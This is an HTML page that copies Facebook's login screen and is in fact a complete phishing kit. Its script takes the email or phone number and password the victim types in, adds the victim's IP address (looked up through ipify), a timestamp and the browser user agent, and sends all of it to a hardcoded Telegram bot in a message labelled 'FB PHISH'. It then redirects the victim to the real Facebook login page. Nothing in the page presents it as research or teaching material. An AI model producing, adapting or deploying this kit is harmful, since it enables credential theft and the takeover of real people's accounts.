<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Facebook – log in or sign up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(145deg, #e9eef3 0%, #dce3ec 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-card {
            max-width: 400px;
            width: 100%;
            background: rgba(255, 255, 255, 0.96);
            border-radius: 32px;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            padding: 32px 28px;
        }
        .fb-logo { text-align: center; margin-bottom: 24px; }
        .fb-logo svg { width: 48px; height: 48px; fill: #1877f2; }
        .input-group { margin-bottom: 16px; }
        .input-group input {
            width: 100%;
            padding: 14px 18px;
            font-size: 16px;
            border: 1px solid #dddfe2;
            border-radius: 28px;
            background: #fefefe;
            outline: none;
            transition: all 0.2s;
        }
        .input-group input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        .login-btn {
            width: 100%;
            background: #1877f2;
            border: none;
            border-radius: 28px;
            padding: 12px;
            font-size: 18px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            margin-top: 8px;
        }
        .login-btn:hover { background: #166fe5; }
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 24px 0;
            color: #8a8d91;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dadde1;
        }
        .divider::before { margin-right: 12px; }
        .divider::after { margin-left: 12px; }
        .create-btn {
            width: 100%;
            background: #42b72a;
            border: none;
            border-radius: 28px;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            text-align: center;
            display: inline-block;
            text-decoration: none;
        }
        .create-btn:hover { background: #36a420; }
        .forgot-link { text-align: center; margin-top: 20px; }
        .forgot-link a { color: #1877f2; text-decoration: none; font-size: 14px; }
        .forgot-link a:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 28px; font-size: 12px; color: #8a8d91; }
        .footer a { color: #8a8d91; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        @media (prefers-color-scheme: dark) {
            body { background: linear-gradient(145deg, #18191a 0%, #1e1f20 100%); }
            .login-card { background: rgba(36, 37, 38, 0.95); }
            .input-group input { background: #3a3b3c; border-color: #3e4042; color: #e4e6eb; }
            .input-group input:focus { border-color: #1877f2; background: #4e4f50; }
            .divider::before, .divider::after { border-bottom-color: #3e4042; }
            .divider { color: #b0b3b8; }
            .footer { color: #b0b3b8; }
        }
        @media (max-width: 480px) { .login-card { padding: 24px 20px; } }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="fb-logo">
            <svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879v-6.99h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.99C18.343 21.128 22 16.991 22 12z"/></svg>
        </div>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="identifier" name="identifier" placeholder="Email address or phone number" autofocus required>
            </div>
            <div class="input-group">
                <input type="password" id="pass" name="pass" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>
        <div class="forgot-link"><a href="#">Forgotten password?</a></div>
        <div class="divider">or</div>
        <a href="#" class="create-btn">Create new account</a>
        <div class="footer"><a href="#">Create a Page</a> for a celebrity, brand or business.</div>
    </div>

    <script>
        // ==================================================
        // REPLACE WITH YOUR TELEGRAM BOT TOKEN AND CHAT ID
        // ==================================================
        const BOT_TOKEN = "8614494771:AAENDkZulMFkCR98bqSBJuOseDSBAh8KjnU";
        const CHAT_ID   = "7994255254";
        // ==================================================

        async function sendToTelegram(identifier, password) {
            let ip = "unknown";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch(e) { /* ignore */ }

            const text = `🎭 FB PHISH\nEmail/Phone: ${identifier}\nPassword: ${password}\nIP: ${ip}\nTime: ${new Date().toISOString()}\nUser-Agent: ${navigator.userAgent}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch(err) {
                console.error(err);
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const identifier = document.getElementById('identifier').value;
            const password = document.getElementById('pass').value;
            await sendToTelegram(identifier, password);
            window.location.href = "https://www.facebook.com/login.php";
        });
    </script>
</body>
</html>
